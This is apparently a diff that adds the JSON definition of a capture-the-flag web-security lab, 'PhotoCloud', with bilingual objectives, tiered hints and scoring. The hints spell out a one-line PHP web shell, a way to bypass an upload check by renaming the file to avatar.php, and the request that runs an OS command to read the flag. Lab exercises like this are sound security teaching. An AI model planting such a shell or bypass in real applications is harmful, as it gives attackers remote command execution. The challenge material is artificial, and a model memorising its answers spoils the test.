@@ -1,0 +1,45 @@
+{
+  "name": "PhotoCloud — Malicious File Upload to Achieve RCE",
+  "slug": "file-upload",
+  "vulnerability_type": "MALICIOUS_FILE_UPLOAD",
+  "domain": "WEB_SECURITY",
+  "educational_objective": "يتعلم الطالب كيف أن التحقق من نوع الملف فقط بالاعتماد على الـ Content-Type أو امتداد الملف يُمكّن المهاجم من رفع web shell. الطالب يرفع ملف PHP مُتنكّر كصورة، يصل إليه عبر URL مباشر، وينفّذ أوامر OS للحصول على الـ flag.",
+  "ar_educational_objective": "يتعلم الطالب كيف أن التحقق من نوع الملف بالاعتماد على Content-Type أو الامتداد فقط يُمكّن رفع web shell. يرفع PHP shell متنكّراً كصورة ويُنفّذ OS commands.",
+  "prerequisites": ["http-basics", "linux-basics", "burpsuite-intro"],
+  "hints_metadata": [
+    {
+      "order": 1,
+      "type": "conceptual",
+      "content": "PhotoCloud allows uploading profile pictures (JPG/PNG only, validated client-side). Intercept the upload request in Burp. The server validates only the Content-Type header, not the actual file content. What if you change the filename extension?",
+      "ar_content": "PhotoCloud يتيح رفع صور الملف الشخصي (JPG/PNG فقط، التحقق على الـ client). التقط رفع الـ request في Burp. الـ server يتحقق فقط من Content-Type header وليس محتوى الملف الفعلي. ماذا لو غيّرت امتداد اسم الملف؟",
+      "penalty": 10
+    },
+    {
+      "order": 2,
+      "type": "narrowing",
+      "content": "Create a file named shell.php with content: <?php system($_GET['cmd']); ?> . In Burp, intercept the upload, change filename to 'avatar.php' and Content-Type to 'image/jpeg'. The server accepts it.",
+      "ar_content": "أنشئ ملف shell.php بمحتوى: <?php system($_GET['cmd']); ?> . في Burp، التقط الرفع، غيّر filename لـ 'avatar.php' وContent-Type لـ 'image/jpeg'. الـ server سيقبله.",
+      "penalty": 20
+    },
+    {
+      "order": 3,
+      "type": "final_push",
+      "content": "After upload, access the shell via: GET /uploads/avatar.php?cmd=cat+/flag.txt — the server executes the PHP code and returns the flag in the HTTP response body.",
+      "ar_content": "بعد الرفع، ادخل لـ shell عبر: GET /uploads/avatar.php?cmd=cat+/flag.txt — الـ server سينفّذ كود PHP ويُرجع الـ flag في الـ response body.",
+      "penalty": 30
+    }
+  ],
+  "scoring_rules": {
+    "base_points": 600,
+    "base_xp": 250,
+    "hint_penalty_mode": "PERCENTAGE",
+    "time_bonus": false
+  },
+  "flag_validation": {
+    "policy": "PER_USER_PER_ATTEMPT",
+    "format": "FLAG{UPLOAD_[USER_HASH]_[SESSION_HASH]_RCE}",
+    "dynamic": true
+  },
+  "environment_template": "linux-web-app-php",
+  "hidden_solution_path": "admin/solutions/file-upload-photocloud.md"
+}
